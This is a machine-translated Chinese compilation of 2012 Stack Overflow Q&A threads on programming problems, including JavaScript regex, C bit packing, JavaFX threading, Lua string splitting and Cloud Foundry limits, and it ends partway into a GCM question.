* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:40:48.277

您必须在您的 2 组合框的同一功能上添加 SelectedIndexChanged 事件（转到您的两个组合框的属性并单击事件和 SelectedIndexChanged）

```
private void ComboBox_SelectedIndexChanged(object sender, System.EventArgs e)
{
            ComboBox cb =  (ComboBox )sender ;
            LanguageSelection = cb.SelectedItem.ToString();
            string[] LanguageTag = LanguageSelection.Split(' ');
            //string tag have to be declared in your application at a global level
            tag = LanguageTag[1].Replace("<", "").Replace(">", "");

} 
```

# javascript - 如何在javascript中使用正则表达式从颜色代码中删除“#”？

> ID：12014346
> 
> 赞同：0
> 
> 时间：2012-08-17T23:25:14.097
> 
> 标签：javascript, regex

我想在 javascript 中使用 RegEx 从颜色代码中删除“#”字符。我试过一个，但我的脚本不工作......请一些人看看并更正我的代码。

```
<html>
    <script>
      var input = "#a478ff";
      var color = input.match(/([a-f]|[A-F]|[0-9])\b*/gi);
      alert(color);
    </script>

</html> 
```

谢谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-17T23:26:24.370

RegEx 对此是不必要的，只需使用`replace()`：

```
var input = "#a478ff";
var color = input.replace('#',''); 
```

或者你可以使用子字符串：

```
var input = "#a478ff";
var color = input.substring(1); 
```

对于那些`#`可能不存在的情况，该`replace()`方法更可靠，因为`substring()`将*始终*“删除”第一个字符；而`replace()`将只替换它找到的内容。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T23:31:07.970

但如果你真的想要一个正则表达式，这里是正确的：

```
var color = input.match(/[A-F0-9]*\b/i);
if (color) { alert(color[0]) }; 
```

# .net - 生成一个由 0 - i 个字符组成的数组

> ID：12014347
> 
> 赞同：0
> 
> 时间：2012-08-17T23:25:21.593
> 
> 标签：.net, unicode, char

我正在尝试使用 '\u...' 语法生成一个字符数组。目的是让用户选择他们想要从某个字符串中过滤掉哪些字符。这就是我目前所拥有的”

```
char[] uChars = new char[1000];
uChars[0] = '\u00e4';
Debug.WriteLine(uChars[0] + " " + Convert.ToUInt16(uChars[0]).ToString("X4"));

for (UInt16 i = 0; i <= 1000; i++) {
    Debug.WriteLine(i.ToString() + " " + i.ToString("X4"));
    Debug.WriteLine(@"'\u" + i.ToString("X4") + @"'");
    // the following line fails syntax but that is what I want to do.
    uChars[0] = @"'\u" + i.ToString("X4") + @"'";
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:31:55.480

您只能`\uxxxx`在字符串和字符文字中使用语法。

要执行您想要的操作，请尝试转换为 char：

```
for (int i = 0; i <= 1000; i++)
{
    uChars[0] = (char)i;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T23:31:32.480

我认为您想使用[Convert.ToChar](http://msdn.microsoft.com/en-us/library/tbhkhhc2%28v=vs.100%29.aspx)。

# java - 用于 STDIN、STDOUT、STDERR 的 java NIO、selectedKeys 和通道

> ID：12014356
> 
> 赞同：0
> 
> 时间：2012-08-17T23:26:15.320
> 
> 标签：java, nio

我有一个程序通过 Pipe.SourceChannel 将标准输出、标准错误和标准输入管道传输到/从 BytesBuffers。

该程序使用选择器注册每个通道。

循环中的程序会周期性地遍历一组 selectedKeys 中的每个键，这些键对应于 stdout、stderr 和 stdin。对于每一个key，它会判断key是否有效，是否可读或可写，如果是，则对一个ByteBuffer进行相应的IO操作

我的问题是，当程序开始时，我可以假设一组最初选择的键（对应于 stdin 、 stdout 、 stderr ）。

标准输入的密钥是否总是第一个准备好、有效和可读的密钥？标准输出的密钥能否在标准输入*之前*准备好、有效且可读？

我问是因为我的程序行为具有随机 IO 行为，并且我猜测我对初始密钥集成员身份的假设是错误的。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-18T01:12:10.423

当有数据可以在没有阻塞的情况下读取时，通道是可读的。

通道是可写的，*除非*它们的内核套接字发送缓冲区没有空间，只有当它们的写入速度快于阅读器的读取速度时才会发生这种情况。

# objective-c - “具有'弱'属性的属性必须是对象类型”的真正含义是什么？

> ID：12014358
> 
> 赞同：8
> 
> 时间：2012-08-17T23:26:28.050
> 
> 标签：objective-c, ios

我的界面中有这个：

```
@property (nonatomic, weak) NSTimeInterval *timeStamp; 
```

我的逻辑告诉我，我需要一个时间戳对象，该对象只会在其实例化的上下文中被此类使用，因此“弱”对我来说似乎是合乎逻辑的——但 XCode 告诉我“带有 ' 的属性弱'属性必须是对象类型“......如果我只是这样做：

```
@property (nonatomic) NSTimeInterval *timeStamp; 
```

然后错误消失了，但我不确定我明白为什么......

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-08-17T23:30:21.330

问题是它`NSTimeInterval`是一个值类型——它`double`本质上是 的别名（检查 NSDate.h 的 typedef）。该`weak`属性仅适用于具有保留计数的对象（即任何从`NSObject`或下降的对象`NSProxy`）。

因此，存储指向的指针`NSTimeInterval`可能是您的错误。您很可能永远不会收到指向 an 的指针，`NSTimeInterval`除非您希望写入给定地址作为函数的输出（在这种情况下可能是回调）。也就是说，我不知道有任何`NSTimeInterval *`作为返回类型的函数，也不知道有任何将其传递给回调的函数。

# python - 在 mongo 集合中保存微标志字符

> ID：12014362
> 
> 赞同：1
> 
> 时间：2012-08-17T23:26:54.553
> 
> 标签：python, unicode, python-unicode

我正在编写一个 python 脚本来创建一个基于 MySql 数据库的 mongo 集合。问题在于微标志字符：

```
bson.errors.InvalidStringData: strings in documents must be valid UTF-8: '\xb5g' 
```

我尝试使用不同的代码（utf-8、latin-1、cp1252、iso-8859-2）对值进行编码/解码但没有成功，但我总是收到以下错误：

```
UnicodeDecodeError: 'ascii' codec can't decode byte 0xb5 in position 0: ordinal not in   range(128) 
```

这是从 mysql 数据库中获取数据的代码。数据库是 USDA 一个 [0](http://ndb.nal.usda.gov/ndb/foods/show/1?fg=&man=&lfacet=&format=&count=&max=25&offset=&sort=&qlookup=)：

```
 # -*- encoding: utf-8 -*-

    import MySQLdb
    mysqldb = MySQLdb.connect(DBCONF)
    cursor = mysqldb.cursor()
    foodid = 1001
    q = (
        ' SELECT nut.Nutr_Val,'
        ' nutdef.Units,'
        ' nutdef.NutrDesc, nutdef.Tagname'
        ' FROM food_des AS f'
        ' JOIN nutrient AS nut ON nut.NDB_No = f.NDB_No'
        ' JOIN nutrient_def AS nutdef ON nutdef.Nutr_No = nut.Nutr_No'
        ' WHERE f.NDB_No = %s'
    ) % str(foodid)
    self.cursor.execute(q) 
```

带有微符号字符的字段是 nutdef.Units 之一。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:57:36.937

只需尝试将字符解码为 latin-1：

```
a = '\xb5g'
# '\xb5g'
print a
# ?g

b = a.decode('latin-1')
print b
# µg

b
# u'\xb5g' 
```

或者，您可以通过告诉它在所有 CHAR、VARCHAR 和 TEXT 字段上使用 unicode 在 MySQL 连接中解决此问题：

```
MySQLdb.connect(..., use_unicode=True) 
```

# string - 在Lua中拆分字符串并替换点字符

> ID：12014382
> 
> 赞同：3
> 
> 时间：2012-08-17T23:30:08.593
> 
> 标签：string, join, lua, split, newline

我有一个存储在 sqlite 数据库中的字符串，我已经将它分配给一个 var，例如字符串

string = "第一行和字符串。这应该是新行中的另一个字符串"

我想将此字符串拆分为两个单独的字符串，点 (.) 必须替换为 (\n) 换行符

目前我被卡住了，任何帮助都会很棒！

```
for row in db:nrows("SELECT * FROM contents WHERE section='accounts'") do
    tabledata[int] = string.gsub(row.contentName, "%.", "\n")
    int = int+1
end 
```

我尝试了在 stachoverflow 中发布的其他问题，但运气为零

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-18T08:49:10.650

这个解决方案怎么样：`

```
s = "First line and string. This should be another string in a new line"
a,b=s:match"([^.]*).(.*)"
print(a)
print(b) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T00:36:58.477

您是否希望将字符串实际拆分为两个不同的字符串对象？如果是这样，也许这会有所帮助。这是我编写的一个函数，用于向标准字符串库添加一些附加功能。您可以按原样使用它，也可以将其重命名为您喜欢的任何名称。

```
--[[

    string.split (s, p)
    ====================================================================
    Splits the string [s] into substrings wherever pattern [p] occurs.

    Returns: a table of substrings or, if no match is made [nil].

--]]
string.split = function(s, p)
    local temp = {}
    local index = 0
    local last_index = string.len(s)

    while true do
        local i, e = string.find(s, p, index)

        if i and e then
            local next_index = e + 1
            local word_bound = i - 1
            table.insert(temp, string.sub(s, index, word_bound))
            index = next_index
        else            
            if index > 0 and index <= last_index then
                table.insert(temp, string.sub(s, index, last_index))
            elseif index == 0 then
                temp = nil
            end
            break
        end
    end

    return temp
end 
```

使用它非常简单，它返回一个字符串表。

```
Lua 5.1.4  Copyright (C) 1994-2008 Lua.org, PUC-Rio
> s = "First line and string. This should be another string in a new line"
> t = string.split(s, "%.")
> print(table.concat(t, "\n"))
First line and string
 This should be another string in a new line
> print(table.maxn(t))
2 
```

# java - JavaFX UI 渲染延迟问题

> ID：12014387
> 
> 赞同：1
> 
> 时间：2012-08-17T23:30:52.837
> 
> 标签：java, user-interface, javafx, javafx-2, delay

我有一个非常简单的 JavaFX 控制器，带有一个简单的用户名、密码和登录按钮。

我想要做的是当用户点击登录时，我想要禁用输入 - 我在代码中使用：

```
this.gridPanelLogon.setDisabled(true); 
```

而且-这可行，但我的问题是-它似乎是线程化的，在此调用之后，我对Web REST服务进行了JerseyClient调用-一旦该代码完成，它就会更新UI并禁用gridPanel。但我想要的是 gridPanel 首先禁用 THEN 调用，并且似乎 UI 仅在所有代码运行后才更新（当它到达上面的代码行时不正确）。

如果我解释得不好，我很抱歉，我很乐意帮助澄清更多，但希望也许有人经历过这种情况并且可以帮助解释原因或解决方法。我还尝试了另一种解决方法，将更改侦听器放置到 gridPanel 的 disabled 属性 - 这不起作用并导致与上述相同的延迟。

任何帮助将不胜感激-谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-18T00:14:37.050

不要在 JavaFX 应用程序线程上运行 client => server 调用，而是通过[Task](http://docs.oracle.com/javafx/2/api/javafx/concurrent/Task.html)或[Service在自己](http://docs.oracle.com/javafx/2/api/javafx/concurrent/Service.html)[的线程](http://docs.oracle.com/javafx/2/threads/jfxpub-threads.htm)中运行它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T03:31:08.687

再次感谢 Jewelsea - 他很好地回答了许多 JavaFX 问题。我想分享这个解决方案，它在我的测试中非常适合我的应用程序。我正在发出 Jersey-Client REST 请求，并将其放在我的 JavaFX 应用程序中（没有创建扩展 javafx.concurrent.Service 的单独类）。

所以我在下面所做的是提供对我来说很好的解决方案，考虑到上面提供的链接jewelsea。成功 POST 到提供的 url 后，此 Service 类将返回一个 ClientResponse 对象。我试图在下面的评论中提供更多关于此的说明。

```
import com.sun.jersey.api.client.Client;
import com.sun.jersey.api.client.ClientHandlerException;
import com.sun.jersey.api.client.ClientResponse;
import com.sun.jersey.api.client.WebResource;
import javafx.beans.property.SimpleStringProperty;
import javafx.beans.property.StringProperty;
import javafx.concurrent.Service;
import javafx.concurrent.Task;

/**
 * This Service class will make REST calls to a given URL,
 * with a JSON encoded request string.
 *
 * OnSucceeded will return a ClientResponse object - will be
 * null if an exception occurred - if no exception is the
 * ClientResponse result of the Jersey-Client call.
 */
public class JerseyClientPostService extends Service<ClientResponse> {

    private StringProperty url = new SimpleStringProperty();
    private StringProperty json = new SimpleStringProperty();

    public JerseyClientPostService() {
        super();
    }

    public JerseyClientPostService(String url, String json) {
        super();
        this.url.set(url);
        this.json.set(json);
    }

    public final String getUrl() {
        return this.url.get();
    }

    public final String getJson() {
        return this.json.get();
    }

    public final void setJson(String json) {
        this.json.set(json);
    }

    public final void setUrl(String url) {
        this.url.set(url);
    }

    @Override protected Task<ClientResponse> createTask() {

        final String _url = getUrl();
        final String _json = getJson();

        return new Task<ClientResponse>() {
            @Override protected ClientResponse call() {
                Client client = Client.create();

                WebResource webResource = client.resource(_url);

                ClientResponse response;
                try {
                    response = webResource.type("application/json").post(ClientResponse.class, _json);
                }
                catch (ClientHandlerException che) {
                    System.err.println("ClientHandlerException connecting to Server: "+che.getMessage());
                    return null;
                }
                catch (Exception ex) {
                    System.err.println("Exception getting response Json: "+ex.getMessage());
                    return null;
                }
                return response;
            }
        };
    }
} 
```

# asp.net - 使用 ParseQueryString 函数从 QueryString 中获取值

> ID：12014389
> 
> 赞同：0
> 
> 时间：2012-08-17T23:30:58.547
> 
> 标签：asp.net, vb.net

我需要从 QueryString 格式的字符串中获取值，例如：data1=value1&data2=value2...

有人建议我使用 HttpUtility.ParseQueryString 来获取值，我已经搜索和搜索但我找不到任何文档或实现，并且 Microsoft 文档没有解释它是如何工作的，有人可以告诉我'我做错了，我的代码在下面；

```
Public Shared Sub ProcessString(ByVal Vstring As String)
    Dim var As NameValueCollection = HttpUtility.ParseQueryString(Vstring)
    Dim vname As String = var.QueryString("VNAME")
End Sub 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:40:39.573

[MSDN](http://msdn.microsoft.com/en-us/library/ms150046.aspx)有一个例子。

```
' Parse the query string variables into a NameValueCollection.
Dim qscoll As System.Collections.Specialized.NameValueCollection = HttpUtility.ParseQueryString(Vstring)
Dim vname As String = qscoll("VNAME") 
```

A`NameValueCollection`表示可以使用键或索引访问的相关字符串键和字符串值的集合。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-18T09:07:30.380

我发现了问题，我引用的一切都很好，但我是在一个单独的 .VB 依赖文件中做的，一旦我在解决问题的 aspx 表单背后的实际代码上做了它，一切都奏效了。所以现在我只是将 Codebehind 中的字符串作为 specialised.NameValue 集合传递给函数。

# facebook - 域被阻止并且没有数据被抓取

> ID：12014391
> 
> 赞同：0
> 
> 时间：2012-08-17T23:31:13.883
> 
> 标签：facebook, dns, sharing, blocked

我最近从 UnoEuro 购买了域名 www.iacro.dk 并安装了 WordPress，计划将博客与 Facebook 集成。但是，我什至无法共享指向该域的链接。

当我尝试在我的时间轴上共享任何链接时，它会给出错误“您尝试共享的内容包含一个因垃圾邮件或不安全而被阻止的链接：iacro.dk”。搜索时，我发现了[Sucuri SiteCheck](http://sitecheck.sucuri.net)，它显示 McAfee TrustedSource 已将该站点标记为包含恶意内容。奇怪的是我刚买了它，它只包含 WordPress，而且我找不到任何以前的所有权历史。但我让 McAfee 对其重新分类，现在它在 SiteCheck 中显示为绿色。然而，现在几天后，Facebook 仍然阻止了它。单击 FB 阻止对话框中的“让我们知道”链接让我进入我提交的“阻止添加内容”表单，但这只是触发了一封确认邮件，指出未处理个别问题。

[然后我注意到与此处](https://stackoverflow.com/questions/10190649/site-not-valid-but-it-is)和[此处](http://facebook.stackoverflow.com/questions/11843242/site-url-blocked-as-spammy-but-also-no-data-was-scraped-in-debug)相同的行为：当我在时间轴上输入任何 iacro.dk 链接时，它会生成一个带有“（无标题）”的空白预览。无论是首页、htm 文档还是图像都没有关系 - 没有返回任何内容。所以我尝试了调试器，它返回非常通用的“错误解析 URL：解析输入 URL 时出错，没有数据被抓取。”。在这个网站上搜索，很多人建议缺少“og：”标签可能不会导致抓取。我为此安装了一个 WP 插件并验证了标签生成，但没有任何改变。而且由于 FB 甚至无法从域中抓取普通的 htm / jpg，我认为可以排除标签。

[这里](https://stackoverflow.com/questions/8631411/open-graph-warnings-when-validating-page-with-facebook-object-debugger)有人建议 301 Redirects 是一个问题，但我还没有设置重定向 - 我什至没有 .htaccess 文件。

所以，我的问题是：这一切都是因为域名被标记为“垃圾邮件”吗？如果是这样，我怎样才能解除FB禁令？但是，我已经看到其他“垃圾邮件”网站的示例，其中预览生成得很好，例如[这个问题](https://stackoverflow.com/questions/10190649/site-not-valid-but-it-is)中描述的[http://dagbok.nu](http://dagbok.nu)。那么如果黑名单不是唯一的问题，还有什么问题呢？

这让我发疯了，所以提前非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-22T11:16:54.653

我不知道细节，但这是 facebook 在共享服务器上托管的网站的问题，即托管您网站的服务器还托管许多其他网站。

# html - 为什么高度和最小高度对子容器的影响不同？

> ID：12014395
> 
> 赞同：0
> 
> 时间：2012-08-17T23:31:40.177
> 
> 标签：html, css

在我的 css 中，我将父级的高度设置为 75px，将子级的高度设置为 100%，并且显示正确。但是，当我将父级的高度属性更改为 75 像素的最小高度时，子级会缩小到它包含的文本的高度，但父级的高度保持 75 像素。为什么孩子不停留75px？

```
#parent{
    height:75px;
    background-color:navy;
    clear:left;
    }
#child{
    width:300px;
    height:100%;
    background-color:aqua;
    float:left;
    } 
```

在这里，孩子应该是 75px。

```
#parent{
    min-height:75px;
    background-color:navy;
    clear:left;
}
#child{
    width:300px;
    height:100%;
    background-color:aqua;
    float:left;
    } 
```

孩子现在只有 21px 高。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T23:47:05.260

我相信这是 CSS 中长期存在的错误（或“功能”）。见[https://stackoverflow.com/a/3808701/1608085](https://stackoverflow.com/a/3808701/1608085)

简而言之，您可以使用

```
min-height: inherit; 
```

在子级中正确地从父级继承 min-height 属性。

# java - android中的堆栈活动

> ID：12014401
> 
> 赞同：1
> 
> 时间：2012-08-17T23:32:35.560
> 
> 标签：java, android

嗨，我正在使用 android，我的活动堆栈有问题。据我所知，当有人使用后退按钮时，重新加载后退活动。但是如果我从一个活动中显示了许多布局，我该如何回到它们。

这是交易，我正在使用一个充满类别的列表视图，当我按下一个项目时，我重用活动和布局，以显示其子类别。所以我需要的是不返回到后面的活动，而不是返回到后面的布局，而是返回到后面的“状态”。

好吧，这个想法很简单，首先我显示没有父项的所有类别，然后当我按下一个项目时，我显示它的子类别。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T23:42:12.470

最简单的方法是创建两个`Activities`- 用于类别和子类别。如果您尝试在单个中实现所有逻辑，`Activity`您将一无所获，最终会完全糊涂。使用`Activities`简化了很多事情，因为它可以处理像你这样的问题。希望这可以帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-18T00:08:58.813

查看 Fragments，它们是视图和活动之间的垫脚石。一个活动可以有多个片段，并将管理它们的后台堆栈（如果你告诉它）。 [http://developer.android.com/guide/components/fragments.html](http://developer.android.com/guide/components/fragments.html)

您必须使用支持库才能在预蜂窝设备上使用它们。

# c - 如何在内存中顺序存储可变长度代码？

> ID：12014402
> 
> 赞同：3
> 
> 时间：2012-08-17T23:32:49.083
> 
> 标签：c, arrays, embedded

假设我有一个二维数组，其中每个条目包含一个长度和一个值：

```
int array[4][2] =  { /* {length, value}, */
                   {5, 3},
                   {6, 7},
                   {1, 0},
                   {8, 15},
                   }; 
```

我想用前导零将它们按顺序存储到内存中，以使每个字段都具有适当的长度。上面的例子是：

```
 00011 000111 0 00001111 
```

第一个块长 5 位，存储十进制 3。第二个块长 6 位，存储十进制 7。第三个块长 1 位，存储十进制 0，最后一个块长 8 位，存储十进制 15。

我可以通过一些按位操作来做到这一点，但我想我会问是否有更简单的方法。

我正在用 C 语言编写 Tensilica 32 位 RISC 处理器。

目的是编写一系列指数哥伦布码。

编辑：解决方案：

```
int main(int argc, char *argv[])
{
    unsigned int i = 0, j = 0;
    unsigned char bit = 0;
    unsigned int bit_num = 0;
    unsigned int field_length_bits = 0;
    unsigned int field_length_bytes = 0;
    unsigned int field_array_length = 0;
    unsigned int field_list[NUM_FIELDS][2] = {
                                            /*{Length, Value},*/ 
                                            {4,  3},
                                            {5,  5},
                                            {6,  9},
                                            {7,  11},
                                            {8,  13},
                                            {9, 15},
                                            {10, 17},
                                         };

    unsigned char *seq_array;

    // Find total length of field list in bits
    for (i = 0; i < NUM_FIELDS; i++) 
        field_length_bits += field_list[i][LENGTH];

    // Number of bytes needed to store FIELD parameters
    for (i = 0; i < (field_length_bits + i) % 8 != 0; i++) ;

    field_length_bytes = (field_length_bits + i) / 8;

    // Size of array we need to allocate (multiple of 4 bytes)
    for (i = 0; (field_length_bytes + i) % 4 != 0; i++) ;

    field_array_length = (field_length_bytes + i);

    // Allocate memory
    seq_array = (unsigned char *) calloc(field_array_length, sizeof(unsigned char));

    // Traverse source and set destination
    for(i = 0; i < NUM_FIELDS; i++)
    {
        for(j = 0; j < field_list[i][LENGTH]; j++)
        {
            bit = 0x01 & (field_list[i][VALUE] >> (field_list[i][LENGTH] - j - 1));
            if (bit)
                setBit(seq_array, field_array_length, bit_num, 1);
            else
                setBit(seq_array, field_array_length, bit_num, 0);
            bit_num++;

        }
    }

    return 0;
}

void setBit(unsigned char *array, unsigned int array_len, unsigned int bit_num, unsigned int bit_value)
{
    unsigned int byte_location = 0;
    unsigned int bit_location = 0;

    byte_location = bit_num / 8;
    if(byte_location > array_len - 1)
    {
        printf("setBit(): Unauthorized memory access");
        return;
    }
    bit_location = bit_num % 8;

    if(bit_value)
        array[byte_location] |= (1 << (7-bit_location));
    else
        array[byte_location] &= ~(1 << (7-bit_location)); 

    return;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T23:49:35.043

您可以使用比特流库：

# **强烈推荐的比特流库：**

[http://cpansearch.perl.org/src/KURIHARA/Imager-QRCode-0.033/src/bitstream.c](http://cpansearch.perl.org/src/KURIHARA/Imager-QRCode-0.033/src/bitstream.c)

[http://cpansearch.perl.org/src/KURIHARA/Imager-QRCode-0.033/src/bitstream.h](http://cpansearch.perl.org/src/KURIHARA/Imager-QRCode-0.033/src/bitstream.h)

因为这个比特流库似乎是非常独立的，并且似乎不需要外部包含。

* * *

[http://www.codeproject.com/Articles/32783/CBitStream-A-simple-C-class-for-reading-and-writin](http://www.codeproject.com/Articles/32783/CBitStream-A-simple-C-class-for-reading-and-writin) - C 库，但使用 windows WORD、DWORD 类型（您仍然可以 typedef 使用此图书馆）

[http://code.google.com/p/youtube-mobile-ffmpeg/source/browse/trunk/libavcodec/bitstream.c?r=8](http://code.google.com/p/youtube-mobile-ffmpeg/source/browse/trunk/libavcodec/bitstream.c?r=8) - 包括许多其他包含文件以使用比特流库

* * *

如果你只想要指数哥伦布代码，有开源 C 实现：

[http://www.koders.com/c/fid8A317DF502A7D61CC96EC4DA07021850B6AD97ED.aspx?s=gcd](http://www.koders.com/c/fid8A317DF502A7D61CC96EC4DA07021850B6AD97ED.aspx?s=gcd)

* * *

或者您可以使用位操作技术。

例如：

```
unsigned int array[4][2] = ???
unsigned int mem[100] = {};
int index=0,bit=0;
for (int i=0;i<4;i++) {
  int shift = (32 - array[i][0] - bit);
  if (shift>0) mem[index] &= array[i][1] << shift;
  else {
    mem[index] &= array[i][1] >> -shift;
    mem[index+1] &= array[i][1] << (32+shift);
  }

  bit += array[i][1];

  if (bit>=32) {
    bit-=32;
    index++;
  }
} 
```

免责声明：

该代码仅在您的计算机字节顺序为小端时才有效，并且结果实际上将是每个 4 字节边界内的小端，以及跨越 4 字节边界的大端。如果将 mem 从 int 类型转换为 char，并将常量 32 替换为 8，您将获得位数组的大端表示。

它还假设长度小于 32。显然，您实际想要的代码将取决于有效输入的范围，以及您想要的字节顺序。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T23:37:52.333

你的意思是像*bit field*吗？

```
struct myBF
{
    unsigned int v1 : 5;
    unsigned int v2 : 5;
    unsigned int v3 : 1;
    unsigned int v4 : 8;
};

struct myBF b = { 3, 7, 0, 15 }; 
```

我可能完全误解了你的要求。如果是这种情况，请发表评论。

* * *

*更新：*假设您想*动态地*执行此操作。让我们创建一个函数，该函数接受一个对数组，就像在您的示例中一样，以及一个输出缓冲区：

```
/* Fill dst with bits.
 * Returns one plus the number of bytes used or 0 on error.
 */
size_t bitstream(int (*arr)[2], size_t arrlen,
                          unsigned char * dst, size_t dstlen)
{
    size_t total_bits = 0, bits_so_far = 0;

    /* Check if there's enough space */
    for (size_t i = 0; i != arrlen; ++i) { total_bits += arr[i][0]; }
    if (dst == NULL || total_bits > CHAR_BIT * dstlen)  { return 0; }

    /* Set the output range to all zero */
    memset(dst, 0, dstlen);

    /* Populate the output range */
    for (size_t i = 0; i != arrlen; ++i)
    {
        for (size_t bits_to_spend = arr[i][0], value = arr[i][1];
             bits_to_spend != 0; /* no increment */ )
        {
            size_t const bit_offset = bits_so_far % CHAR_BIT;
            size_t const byte_index = bits_so_far / CHAR_BIT;
            size_t const cur_byte_capacity = CHAR_BIT - bit_offset;

            /* Debug: Watch it work! */
            printf("Need to store %zu, %zu bits to spend, capacity %zu.\n",
                   value, bits_to_spend, cur_byte_capacity);

            dst[byte_index] |= (value << bit_offset);

            if (cur_byte_capacity < bits_to_spend)
            {
                value        >>= cur_byte_capacity;
                bits_so_far   += cur_byte_capacity;
                bits_to_spend -= cur_byte_capacity;
            }
            else
            {
                bits_so_far += bits_to_spend;
                bits_to_spend = 0;
            }
        }
    }

    return (bits_so_far + CHAR_BIT - 1) / CHAR_BIT;
} 
```

笔记：

*   如果数字`arr[i][1]`不适合`arr[i][0]`位，则仅存储余数模 2 ^(`arr[i][0]`)。

*   为了完全正确，数组类型也应该是无符号的，否则初始化`size_t value = arr[i][1]`可能是未定义的行为。

*   您可以修改错误处理行为。例如，您可以放弃事务性并将长度检查移到主循环中。此外，`0`您可以返回*所需*的字节数，而不是返回，以便用户可以确定目标数组需要多大（就像这样`snptrintf`做）。

用法：

```
unsigned char dst[N];
size_t n = bitstream(array, sizeof array / sizeof *array, dst, sizeof dst);
for (size_t i = 0; i != n; ++i) { printf("0x%02X ", dst[n - i - 1]); } 
```

对于您的示例，这将产生`0x00 0xF0 0xE3`，即：

```
 0x00     0xF0     0xE3
00000000 11110000 11100011

0000 00001111 0 000111 00011
padd    15    0    7     3 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T23:36:11.453

`char`在标准 C 中，除了您提到的“按位操作”之外，没有其他方法可以访问小于 a的任何内容。恐怕你运气不好，除非你在某个地方遇到可以帮助你的图书馆。

# java - Cloud Foundry：错误 402：应用程序打包失败：“应用程序超出最大允许大小 (536.87MB)”

> ID：12014403
> 
> 赞同：1
> 
> 时间：2012-08-17T23:32:53.920
> 
> 标签：java, spring, cloud-foundry

`$ vmc stats`我的应用程序肯定很大，但考虑到我的设置是这样的，536MB 的限制似乎很奇怪 ：

```
+----------+-------------+----------------+--------------+---------------+
| Instance | CPU (Cores) | Memory (limit) | Disk (limit) | Uptime        |
+----------+-------------+----------------+--------------+---------------+
| 0        | 1.3% (4)    | 976.5M (2G)    | 263.0M (2G)  | 0d:0h:32m:56s |
+----------+-------------+----------------+--------------+---------------+ 
```

有谁知道如何避免 402 错误？

干杯，布莱恩

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-18T08:56:35.830

“droplet 大小”（应用程序的源和资源的总大小）的实际（默认）限制为 512MB；结果是 536 * 10^6 字节。

如果您在 cloudfoundry.com 上运行，那么就是这样，您无法控制该参数，您所能做的就是减少代码的大小。但是，我*认为*这个限制适用于分期前的大小。这意味着您可能可以将一些代码拆分为 Maven 依赖项。值得一试。

但是，如果您有自己的安装，则可以通过编辑 cloud_controller.yml 并更改`max_droplet_size`参数来解决此问题。请注意，该值被解释为字节，做你的数学:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-09T08:46:39.700

`max_droplet_size`已更改为`max_package_size`. 但是，您可能还必须更改 nginx 的`client_max_body_size`.

# django - 使用pyjade的Django项目中的TemplateNotFound？

> ID：12014404
> 
> 赞同：0
> 
> 时间：2012-08-17T23:32:58.367
> 
> 标签：django, pug, pyjade

我有一个`layout.jade`只包含一个基本骨架的文件：

```
html
head
body
    header
    block content

    footer 
```

在同一目录中，我还有一个`mypage.jade`文件包含

```
extends layout
block content
    p Hello World 
```

渲染`layout.jade`为响应就可以了。但是，当我尝试渲染`mypage.jade`它时，它没有通过，并且出现`TemplateDoesNotExist`错误。是什么赋予了？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-21T20:56:01.723

原来你必须在 Django 中将显式目录添加到 TEMPLATE_DIRS `settings.py`，一切正常

# javascript - 对多个 If Thens 使用 Javascript 哈希表

> ID：12014406
> 
> 赞同：1
> 
> 时间：2012-08-17T23:33:21.143
> 
> 标签：javascript, hashtable

```
foo = document.getElementById("outer");

function cycleIt() {
    if (client.browser.Firefox) {
        foo.addEventListener("animationend", updateClassName, true);
    } else {
        foo.addEventListener("webkitAnimationEnd", updateClassName, true);
    }
}

function updateClassName() {

    var z = foo.getAttribute("class");

    if ( z == "a" ) {
        foo.className = "b";
    } else if ( z == "b" ) {
        foo.className = "c"
    } else if ( z == "c" ) {
        foo.className = "d"
    } else {
        foo.className = "a"
    }
    return foo;
} 
```

有人在 Javascript 聊天频道上告诉我，我应该为多个 if then 语句制作一个哈希表。我该怎么做呢？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-17T23:36:52.737

您创建哈希表（实际上只是一个普通对象）：

```
var table = {
    "a": "b",
    "b": "c",
    "c": "d"
}; 
```

然后使用该表将输入映射`z`到输出（类名）：

```
var z = foo.getAttribute("class");
foo.className = table[z] || "a";
return foo; 
```

语法`table[z] || "a"`是一种简写方式

```
if (table[z] === undefined) {
    foo.className = "a";
}
else {
    foo.className = table[z];
} 
```

这两种样式并不完全等价，但在这种情况下（散列中的所有值都是字符串，并且没有一个是空字符串），它的工作方式相同。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T23:37:38.517

您要做的是将`z`值映射到类名，如下所示：

```
function updateClassName() {
    foo.className = ({
        a: "b",
        b: "c",
        c: "d"
    })[foo.className] || "a";
    return foo;
} 
```

对象字面量是指定哪个旧值（键）应该去哪个新值（值）的映射。此外，它用于`|| "a"`指定默认情况。

# c# - GCM 消息未传递

> ID：12014411
> 
> 赞同：4
> 
